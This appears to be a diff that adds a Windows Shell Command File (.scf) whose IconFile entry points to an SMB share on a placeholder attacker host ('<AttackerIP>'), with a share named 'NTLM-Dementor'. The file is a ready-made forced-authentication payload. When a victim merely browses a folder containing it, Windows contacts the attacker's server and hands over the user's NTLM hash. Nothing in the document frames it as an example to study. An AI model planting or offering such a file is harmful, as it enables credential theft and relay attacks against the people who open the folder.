@@ -1,0 +1,5 @@
+[Shell]
+Command=2
+IconFile=\\<AttackerIP>\NTLM-Dementor\NTLM-Dementor.ico
+[Taskbar]
+Command=ToggleDesktop
